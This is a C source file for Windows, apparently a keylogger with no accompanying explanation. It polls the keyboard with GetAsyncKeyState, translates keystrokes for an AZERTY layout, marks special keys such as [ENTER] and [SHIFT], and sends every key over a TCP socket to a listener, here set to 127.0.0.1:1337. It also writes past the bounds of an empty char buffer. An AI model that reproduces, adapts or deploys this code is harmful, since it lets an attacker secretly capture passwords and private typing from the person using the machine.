#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

int main()
{
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;

    char inst[] = "";
    char key;

    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons(1337);

    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0)
    {
        printf("Failed : %d", WSAGetLastError());
        return -1;
    }

    sock =  socket(AF_INET, SOCK_STREAM, 0x0);

    if(sock == INVALID_SOCKET)
    {
        printf("Failed : %d", WSAGetLastError());
        return -1;
    }

    if(connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        printf("Error\n");
        return -1;
    }

    while (1)
    {
        for (key = 8; key < 128; key++)
        {
            if (GetAsyncKeyState(key) == -32767) {

                if ((key > 33) && (key <= 64)) {

                    if (key == 48) {
                        if (((GetKeyState(VK_CAPITAL) & 0x0001) != 0) || (GetAsyncKeyState(0x10))) {
                            send(sock, "0", 1, 0);
                        }
                        else if (GetAsyncKeyState(17)) {
                            send(sock, "@", 1, 0);
                        }
                        else {
                            send(sock, "à", 1, 0);
                        }
                    }

                    else if (key == 49) {
                        if (((GetKeyState(VK_CAPITAL) & 0x0001) != 0) || (GetAsyncKeyState(0x10))) {
                            send(sock, "1", 1, 0);
                        }
                        else {
                            send(sock, "&", 1, 0);
                        }
                    }

                    else if (key == 50) {
                        if (((GetKeyState(VK_CAPITAL) & 0x0001) != 0) || (GetAsyncKeyState(0x10))) {
                            send(sock, "2", 1, 0);
                        }
                        else if (GetAsyncKeyState(17)) {
                            send(sock, "~", 1, 0);
                        }
                        else {
                            send(sock, "é", 1, 0);
                        }
                    }

                    else if (key == 51) {
                        if (((GetKeyState(VK_CAPITAL) & 0x0001) != 0) || (GetAsyncKeyState(0x10))) {
                            send(sock, "3", 1, 0);
                        }
                        else if (GetAsyncKeyState(17)) {
                            send(sock, "#", 1, 0);
                        }
                        else {
                            send(sock, "\"", 1, 0);
                        }
                    }

                    else if (key == 52) {
                        if (((GetKeyState(VK_CAPITAL) & 0x0001) != 0) || (GetAsyncKeyState(0x10))) {
                            send(sock, "4", 1, 0);
                        }
                        else if (GetAsyncKeyState(17)) {
                            send(sock, "{", 1, 0);
                        }
                        else {
                            send(sock, "'", 1, 0);
                        }
                    }

                    else if (key == 53) {
                        if (((GetKeyState(VK_CAPITAL) & 0x0001) != 0) || (GetAsyncKeyState(0x10))) {
                            send(sock, "5", 1, 0);
                        }
                        else if (GetAsyncKeyState(17)) {
                            send(sock, "[", 1, 0);
                        }
                        else {
                            send(sock, "(", 1, 0);
                        }
                    }

                    else if (key == 54) {
                        if (((GetKeyState(VK_CAPITAL) & 0x0001) != 0) || (GetAsyncKeyState(0x10))) {
                            send(sock, "6", 1, 0);
                        }
                        else if (GetAsyncKeyState(17)) {
                            send(sock, "|", 1, 0);
                        }
                        else {
                            send(sock, "-", 1, 0);
                        }
                    }

                    else if (key == 55) {
                        if (((GetKeyState(VK_CAPITAL) & 0x0001) != 0) || (GetAsyncKeyState(0x10))) {
                            send(sock, "7", 1, 0);
                        }
                        else if (GetAsyncKeyState(17)) {
                            send(sock, "`", 1, 0);
                        }
                        else {
                            send(sock, "è", 1, 0);
                        }
                    }

                    else if (key == 56) {
                        if (((GetKeyState(VK_CAPITAL) & 0x0001) != 0) || (GetAsyncKeyState(0x10))) {
                            send(sock, "8", 1, 0);
                        }
                        else if (GetAsyncKeyState(17)) {
                            send(sock, "\"", 1, 0);
                        }
                        else {
                            send(sock, "_", 1, 0);
                        }
                    }

                    else if (key == 57) {
                        if (((GetKeyState(VK_CAPITAL) & 0x0001) != 0) || (GetAsyncKeyState(0x10))) {
                            send(sock, "9", 1, 0);
                        }
                        else if (GetAsyncKeyState(17)) {
                            send(sock, "^", 1, 0);
                        }
                        else {
                            send(sock, "ç", 1, 0);
                        }
                    }
                    else {
                        send(sock, inst, sizeof(inst), 0);
                    }

                }
                else if ((key > 64) && (key < 91)){
                    if (((GetKeyState(VK_CAPITAL) & 0x0001) != 0) || (GetAsyncKeyState(0x10))) {
                        sprintf(inst, "%c", key);
                        send(sock, inst, sizeof(inst), 0);
                    }
                    else {
                        sprintf(inst, "%c", key + 32);
                        send(sock, inst, sizeof(inst), 0);
                    }
                }
                else {
                    switch (key)
                    {
                        case VK_SPACE:
                            send(sock, " ", 1, 0);
                            break;

                        case VK_MENU:
                            send(sock, "[ALT]", 5, 0);
                            break;

                        case VK_CONTROL:
                            send(sock, "[CTRL]", 6, 0);
                            break;

                        case VK_UP:
                            send(sock, "[UP]", 4, 0);
                            break;

                        case VK_DOWN:
                            send(sock, "[DOWN]", 6, 0);
                            break;

                        case VK_LEFT:
                            send(sock, "[LEFT]", 6, 0);
                            break;

                        case VK_RIGHT:
                            send(sock, "[RIGHT]", 7, 0);
                            break;

                        case VK_TAB:
                            send(sock, "[TAB]", 5, 0);
                            break;

                        case VK_CAPITAL:
                            send(sock, "[MAJ]", 5, 0);
                            break;

                        case VK_SHIFT:
                            send(sock, "[SHIFT]", 7, 0);
                            break;

                        case VK_RETURN:
                            send(sock, "[ENTER]", 7, 0);
                            break;

                        case VK_BACK:
                            send(sock, "[BACK]", 6, 0);
                            break;

                    }
                }
            }
        }
        Sleep(1);

    }

    return 0;
}
